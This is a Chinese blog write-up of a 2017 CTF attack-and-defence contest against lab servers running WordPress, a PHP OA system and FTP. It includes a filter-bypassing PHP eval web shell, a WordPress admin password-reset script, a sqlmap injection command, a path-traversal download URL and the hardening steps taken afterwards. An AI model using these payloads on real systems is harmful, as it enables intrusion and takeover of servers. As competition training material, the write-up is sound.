---
title: 2017 信息安全铁人三项赛企业赛华南赛区 WriteUp
tags:
  - CTF
  - Web
  - WriteUp
  - 审计
  - 加固
  - 上传
date: 2017-04-23 20:42:59
---

## “企业夺旗”模式

```
web1：192.168.5.11 wordpress
```
<!-- more -->
fuzzing中发现test目录存在测试上传页面，随便传一个php网马上去可以看到该页面源码，主要过滤代码如下
```php
while($next = preg_replace("/&lt;\\?/", "", $data)){ 
    $next = preg_replace("/php/", "", $next); 
    if($data === $next) { 
        break; 
    } 
    source(); 
    $data = $next; 
}
```
不难看出对‘php’进行循环过滤，我是`构造大小写加script`绕过的
```php
<script language="pHp">eval($_POST[x]);</script>
```
菜刀连接后在网站根目录找到`flag1`。

然后利用网上找的代码修改`wordpress admin`密码
```php
<?php
//password resetter
include("wp-config.php");
include("wp-blog-header.php");
if (empty($_POST['emergency_pass'])) {
?>
    <form method="post">
      set admin password: <input name="emergency_pass" type="password" />
      <input type="submit" />
    </form>
<?php
} else {
    $sql = "UPDATE ".$wpdb->users." SET user_pass = '".md5($_POST['emergency_pass'])."' WHERE User_login = 'admin'";
    $link = $wpdb->query($sql);
    wp_redirect('wp-login.php');
    exit();
}
?>
```
在后台找了一圈没看到flag，把账号密码甩给队友，队友在导出所有内容中找到了`flag7`

尝试提权失败，Centos7 3.1内核，后来下午加固赛发现ssh密码是弱密码，早上拿一血的队伍是直接`ssh爆破`get的

```
web2：192.168.2.12  PHPOA
```
百度这个oa系统找到了这个
[某协同网络办公OA系统若干漏洞打包（附详细分析）](http://www.shellsec.com/tech/151965.html)

注入拿到后台账号密码`test` `admin123`
```
python sqlmap.py -u "http://192.168.2.12/admin.php?ac=duty&amp;fileurl=duty" --data "do=excel&amp;number=1" -D myoa --tables
```
进了后台看到`flag10`

找到两个上传点，一个ewe的编辑器，发现后缀名绕不过去然后用了另一个上传点，

用`任意文件下载漏洞`下载了`/upload_file.php`源码
```
http://192.168.2.12/down.php?urls=data/../upload_file.php
```
```php
if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&( $uploaded_size < 100000 ) &&getimagesize( $uploaded_tmp ) ) {
    // Can we move the file to the upload folder?
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
        // No
        echo 'Your image was not uploaded.';
    }
    else {
        // Yes!
        echo ltrim($target_path,'.')." succesfully uploaded!";
    }
}
```
直接上传图马菜刀连接，网站根目录拿到`flag3`

这时名次徘徊在5.6名，队友说发现一个FTP服务器
```
FTP：192.168.5.13
```
8uftp连接，下意识输入`admin` `admin`，直接弱密码连接成功，我和两个队友都惊呆了

ftp里一共四个flag，一个明文`flag2`，另外三个在`another-flag.zip` 中，
队友解开伪加密，里面有个明文的`flag11`，还有一个c语言源码，是道`pwn`题，
令人惊讶的是这道题是道原题，i春秋有视频解析的一道题
[http://www.ichunqiu.com/course/53923](http://www.ichunqiu.com/course/53923)

通过输入名字长度为40位+已知flag，就能得到下一位flag
如输入`aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaflag`就能看到下一位`8`，这个flag是`flag8`，然后输入
`aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaflag8`就能看到下一位`{`，依次类推直到看见`}`。

还有一个apk安卓文件，两个队友到最后也只解出了`flag9{}`，但是中间部分没解出来
夺旗赛剩下的时间都在研究linux提权，一直以为服务器根目录还有flag，到最后也没拿下。

## “企业加固”模式

加固赛给了四个服务器
```
web1/linux：192.168.5.11
ftp/linux：192.168.5.13
域控制器/win7：192.168.忘记是啥了
web2/linux：192.168.2.12
```
这里的域控制器早上一直没扫到，登陆进去发现`flag4`但是已经晚了

我的加固步骤如下：
```
修改web1，域控制器登录弱密码
修改ftp服务器中的admin账号弱密码
删除web1的test目录
删除web2页面中的几个备份文件
删除web2测试账号
web2任意文件下载限制php后缀
web2文件上传添加后缀限制
web1，web2添加waf防止注入
```

另外win7加固扔给队友了，因为最近的`fb.py`嘛

分数最高的时候拿到第二，最终拿下第三名。

## 总结

第一次参加这种类型的比赛，感觉准备的还不是很充分，上午拿flag因为web太慢第一个小时差点心态爆炸，两个服务器弱密码都没有找出来，ftp弱密码也只是运气好拿到的，下午的加固赛中没有和队友沟通好，基本是只有两个人在战斗，差点第三不保。最终的成绩还是比较满意的，意识到自己的很多不足，也慢慢找到了适合自己的网络安全方向，偏代码审计方向。奖金5000块还是有点美滋滋的哈哈哈哈。

![](/img/2017t3sec.jpg)